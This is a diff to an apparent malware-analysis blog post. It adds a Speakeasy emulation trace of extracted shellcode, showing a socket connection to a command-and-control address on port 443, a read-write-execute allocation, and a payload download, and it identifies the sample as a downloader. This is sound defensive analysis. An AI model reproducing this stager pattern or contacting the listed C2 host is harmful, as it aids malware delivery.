@@ -44,6 +44,25 @@ We can validate this by using the disassemble x86 operator in CyberChef.
 
 <img width="1386" alt="image" src="https://github.com/MZHeader/MZHeader.github.io/assets/151963631/6279660b-dcb3-4cac-945e-98395f92b469">
 
+We can emulate this shellcode by using Speakeasy, we'll save the shellcode from CyberChef and run it against Speakeasy to reveal the following code:
+
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/038af658-e528-4fc0-a982-88c87b10dc21)
+
+```
+* exec: shellcode
+0x10a2: 'kernel32.LoadLibraryA("ws2_32")' -> 0x78c00000
+0x10b2: 'ws2_32.WSAStartup(0x190, 0x1203e4c)' -> 0x0
+0x10c1: 'ws2_32.WSASocketA("AF_INET", "SOCK_STREAM", 0x0, 0x0, 0x0, 0x0)' -> 0x4
+0x10db: 'ws2_32.connect(0x4, "51.79.49.174:443", 0x10)' -> 0x0
+0x10f8: 'ws2_32.recv(0x4, 0x1203e40, 0x4, 0x0)' -> 0x4
+0x110b: 'kernel32.VirtualAlloc(0x0, 0x8, 0x1000, "PAGE_EXECUTE_READWRITE")' -> 0x50000
+0x1119: 'ws2_32.recv(0x4, 0x50000, 0x8, 0x0)' -> 0x8
+0x50008: Unhandled interrupt: intnum=0x3
+0x50008: shellcode: Caught error: unhandled_interrupt
+* Finished emulating
+```
+
+It looks like this is a downloader, with a C2 address of 51.79.49[.]174:443
 
 
 
